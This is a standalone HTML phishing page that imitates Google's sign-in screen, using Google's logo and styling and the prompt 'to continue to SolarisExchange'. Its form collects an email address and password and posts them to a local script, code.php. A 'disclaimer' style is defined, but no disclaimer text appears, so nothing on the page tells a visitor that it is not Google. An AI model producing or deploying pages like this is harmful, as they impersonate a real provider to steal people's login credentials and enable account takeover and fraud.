<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sign in – Google Accounts</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet"/>
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      width: 100%;
      max-width: 360px;
      padding: 2rem;
      border: 1px solid #dadce0;
      border-radius: 8px;
      box-shadow: 0 2px 3px rgba(0,0,0,0.1);
    }
    .logo {
      display: block;
      margin: 0 auto 1rem;
      width: 75px;
    }
    h1 {
      font-size: 1.5rem;
      margin-bottom: 0.25rem;
      text-align: center;
    }
    p {
      font-size: 0.9rem;
      color: #5f6368;
      text-align: center;
      margin-bottom: 1.5rem;
    }
    label {
      display: block;
      font-size: 0.8rem;
      margin-bottom: 0.25rem;
      color: #202124;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 1rem;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 1rem;
    }
    button {
      width: 100%;
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px;
      font-size: 1rem;
      border-radius: 4px;
      cursor: pointer;
    }
    .disclaimer {
      margin-top: 1rem;
      font-size: 0.75rem;
      color: red;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo"/>
    <h1>Sign in</h1>
    <p>to continue to SolarisExchange</p>
    <form method="POST" action="code.php">
      <label for="email">Email or phone</label>
      <input type="email" id="email" name='email' required/>

      <label for="password">Password</label>
      <input type="password" id="password" name='password' required/>

      <button type="submit">Next</button>
    </form>
  </div>

  <script>
  </script>
</body>
</html>
